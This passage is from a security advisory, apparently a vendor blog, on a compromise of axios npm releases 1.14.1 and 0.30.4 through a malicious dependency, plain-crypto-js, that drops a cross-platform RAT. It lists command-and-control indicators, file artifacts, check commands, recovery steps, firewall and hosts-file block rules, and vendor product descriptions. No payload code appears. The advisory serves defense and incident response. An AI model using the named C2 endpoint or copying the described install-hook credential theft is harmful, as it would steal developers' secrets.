* axios@0.30.4 · shasum: d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71
* plain-crypto-js@4.2.1 · shasum: 07d889e2dadce6f3910dcbc253317d28ca61c766

Network Indicators

* C2 domain · sfrclak.com
* C2 IP · 142.11.206.73
* C2 URL ·http://sfrclak.com:8000/6202033
* C2 POST body (macOS) · packages.npm.org/product0
* C2 POST body (Windows) · packages.npm.org/product1
* C2 POST body (Linux) · packages.npm.org/product2

File System Indicators

* macOS · /Library/Caches/com.apple.act.mond
* Windows (persistent) · %PROGRAMDATA%\wt.exe
* Windows (temp, self-deletes) · %TEMP%\6202033.vbs
* Windows (temp, self-deletes) · %TEMP%\6202033.ps1
* Linux · /tmp/ld.py

Attacker-Controlled Accounts

* jasonsaayman · compromised legitimate axios maintainer, email changed toifstap@proton.me
* nrwise · attacker-created account,nrwise@proton.me, published plain-crypto-js

Safe Version Reference

* axios@1.14.0 (safe) · shasum: 7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb

## Am I Affected?

Step 1 – Check for the malicious axios versions in your project:

npm list axios 
2
>
/dev/
null
 | grep -E 
"1\.14\.1|0\.30\.4"

grep -A1 
'"axios"'
 package-lock.json | grep -E 
"1\.14\.1|0\.30\.4"

Step 2 – Check forplain-crypto-jsinnode_modules:

ls node_modules/plain-crypto-js 
2
>
/dev/
null
 && echo 
"POTENTIALLY AFFECTED"

Ifsetup.jsalready ran,package.jsoninside this directory will have been replaced with a clean stub. The presence of the directory alone is sufficient evidence the dropper executed.

Step 3 – Check for RAT artifacts on affected systems:

# macOS

ls -la /Library/Caches/com.apple.act.mond 
2
>
/dev/
null
 && echo 
"COMPROMISED"

# Linux

ls -la /tmp/ld.py 
2
>
/dev/
null
 && echo 
"COMPROMISED"

 
"COMPROMISED"

# Windows (cmd.exe)

dir 
"%PROGRAMDATA%\wt.exe"
 
2
>nul && echo COMPROMISED

Step 4 – Check CI/CD pipelines:

Review pipeline logs for anynpm installexecutions that may have pulledaxios@1.14.1oraxios@0.30.4. Any pipeline that installed either version should be treated as compromised and all injected secrets rotated immediately.

## For the Community: Recovery Steps

1. Downgrade axios to a clean version and pin it.

npm install axios@
1.14
.0
 # 
for
 
1.
x users

npm install axios@
0.30
.3
 # 
for
 
0.
x users 

2. Add anoverridesblock to prevent transitive resolution back to the malicious versions

{

 
"dependencies"
: { 
"axios"
: 
"1.14.0"
 },

 
"overrides"
: { 
"axios"
: 
"1.14.0"
 },

 
"resolutions"
: { 
"axios"
: 
"1.14.0"
 }

} 

3. Removeplain-crypto-jsfromnode_modules.

rm -rf node_modules/plain-crypto-js

npm install --ignore-scripts 

4. If a RAT artifact is found: treat the system as fully compromised. Do not attempt to clean in place - rebuild from a known-good state. Rotate all credentials on any system where the malicious package ran: npm tokens, AWS access keys, SSH private keys, cloud credentials (GCP, Azure), CI/CD secrets, and any values present in.envfiles accessible at install time.

5. Audit CI/CD pipelines for runs that installed the affected versions. Any workflow that executednpm installwith these versions should have all injected secrets rotated.

6. Use--ignore-scriptsin CI/CD as a standing policy to preventpostinstallhooks from running during automated builds:

npm ci --ignore-scripts 

7. Block C2 traffic at the network/DNS layer as a precaution on any potentially exposed system

 # Block via firewall (Linux)

iptables -A OUTPUT -d 
142.11
.206
.73
-j DROP

# Block via /etc/hosts (macOS/Linux)

echo 
"0.0.0.0 sfrclak.com"
 >> 
/etc/
hosts 

## For StepSecurity Enterprise Customers

### Harden-Runner

Harden-Runneris a purpose-built security agent for CI/CD runners.

It enforces a network egress allowlist in GitHub Actions, restricting outbound network traffic to only allowed endpoints. Both DNS and network-level enforcement prevent covert data exfiltration. The C2 callback tosfrclak.com:8000and the payload fetch in thepostinstallscript would have been blocked at the network level before the RAT could be delivered.

Harden-Runner also automatically logs outbound network traffic per job and repository, establishing normal behavior patterns and flagging anomalies. This reveals whether maliciouspostinstallscripts executed exfiltration attempts or contacted suspicious domains, even when the malware self-deletes its own evidence afterward. The C2 callback tosfrclak.com:8000was flagged as anomalous because it had never appeared in any prior workflow run.

### Detect Compromised Developer Machines

Supply chain attacks like this one do not stop at the CI/CD pipeline. The maliciouspostinstallscript inplain-crypto-js@4.2.1drops a cross-platform RAT designed to run on the developer's own machine, harvesting credentials, SSH keys, cloud tokens, and other secrets from the local environment. Every developer who rannpm installwith the compromised axios version outside of CI is a potential point of compromise.

StepSecurity Dev Machine Guardgives security teams real-time visibility into npm packages installed across every enrolled developer device. When a malicious package is identified, teams can immediately search by package name and version to discover all impacted machines, as shown below withaxios@1.14.1andaxios@0.30.4.

### npm Package Cooldown Check

Newly published npm packages are temporarily blocked during a configurable cooldown window. When a PR introduces or updates to a recently published version, the check automatically fails. Since most malicious packages are identified within 24 hours, this creates a crucial safety buffer. In this case,plain-crypto-js@4.2.1was published hours before the axios releases, so any PR updating toaxios@1.14.1oraxios@0.30.4during the cooldown period would have been blocked automatically.

### npm Package Compromised Updates Check

StepSecurity maintains a real-time database of known malicious and high-risk npm packages, updated continuously, often before official CVEs are filed. If a PR attempts to introduce a compromised package, the check fails and the merge is blocked. Bothaxios@1.14.1andplain-crypto-js@4.2.1were added to this database within minutes of detection.

### npm Package Search

Search across all PRs in all repositories across your organization to find where a specific package was introduced. When a compromised package is discovered, instantly understand the blast radius: which repos, which PRs, and which teams are affected. This works across pull requests, default branches, and dev machines.

### AI Package Analyst

AI Package Analystcontinuously monitors the npm registry for suspicious releases in real time, scoring packages for supply chain risk before you install them. In this case, bothaxios@1.14.1andplain-crypto-js@4.2.1were flagged within minutes of publication, giving teams time to investigate, confirm malicious intent, and act before the packages accumulated significant installs. Alerts include the full behavioral analysis, decoded payload details, and direct links to the OSS Security Feed.

### Threat Center Alert

StepSecurity has published a threat intel alert in the Threat Center with all relevant links to check if your organization is affected. The alert includes the full attack summary, technical analysis, IOCs, affected versions, and remediation steps, so teams have everything needed to triage and respond immediately. Threat Center alerts are delivered directly into existing SIEM workflows for real-time visibility.

## Acknowledgements

We want to thank the axios maintainers and the community members who quickly identified and triaged the compromise inGitHub issue #10604. Their rapid response, collaborative analysis, and clear communication helped the ecosystem understand the threat and take action within hours.

We also want to thank GitHub for swiftly suspending the compromised account and npm for quickly unpublishing the malicious axios versions and placing a security hold onplain-crypto-js. The coordinated response across maintainers, GitHub, and npm significantly limited the window of exposure for developers worldwide.